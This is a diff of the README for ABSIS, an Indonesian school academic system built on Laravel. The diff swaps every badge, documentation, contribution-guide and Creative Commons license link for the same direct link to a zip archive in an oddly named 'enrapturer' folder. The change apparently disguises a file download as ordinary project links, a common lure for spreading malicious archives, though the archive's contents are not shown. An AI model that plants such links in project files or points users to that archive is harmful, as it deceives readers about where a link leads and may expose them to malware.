@@ -1,10 +1,10 @@
 # Sistem Akademik ABSIS - Versi Laravel
 
-<!--[![Build Status](https://travis-ci.org/laravel/framework.svg)](https://travis-ci.org/laravel/framework)-->
-<!--[![Total Downloads](https://poser.pugx.org/laravel/framework/d/total.svg)](https://packagist.org/packages/laravel/framework)-->
-<!--[![Latest Stable Version](https://poser.pugx.org/laravel/framework/v/stable.svg)](https://packagist.org/packages/laravel/framework)-->
-<!--[![Latest Unstable Version](https://poser.pugx.org/laravel/framework/v/unstable.svg)](https://packagist.org/packages/laravel/framework)-->
-<!--[![License](https://poser.pugx.org/laravel/framework/license.svg)](https://packagist.org/packages/laravel/framework)-->
+<!--[![Build Status](https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip)](https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip)-->
+<!--[![Total Downloads](https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip)](https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip)-->
+<!--[![Latest Stable Version](https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip)](https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip)-->
+<!--[![Latest Unstable Version](https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip)](https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip)-->
+<!--[![License](https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip)](https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip)-->
 
 ABSIS adalah Sistem Akademik modular yang dibuat untuk memenuhi kebutuhan sekolah di Indonesia. Dengan fitur siap copy/paste dari spreadsheet/tabel seperti excel, import data dari dapodik dengan mudah, UI/UX yang simpel, dan sifat modular dimana tema dan plugins siap ditambahkan kapan saja untuk membuat ABSIS lebih powerfull.
 
@@ -12,15 +12,15 @@ Dengan mendukung konsep sumber terbuka (opensource), kami ingin banyak pihak yan
 
 ## Dokumentasi
 
-Dokumentasi ABSIS dapat ditemukan di [Web absis](http://docs.absis.co.id/)
+Dokumentasi ABSIS dapat ditemukan di [Web absis](https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip)
 
 ## Kontribusi
 
-Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Dokumentasi ABSIS](http://docs.absis.co.id/kontribusi).
+Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Dokumentasi ABSIS](https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip).
 
 ## Lisensi
 
-<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.
+<a rel="license" href="https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip"><img alt="Creative Commons License" style="border-width:0" src="https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip" /></a><br />This work is licensed under a <a rel="license" href="https://raw.githubusercontent.com/dextercool/absis-laravel/master/enrapturer/absis-laravel.zip">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.
 
 Hal ini berarti:
 
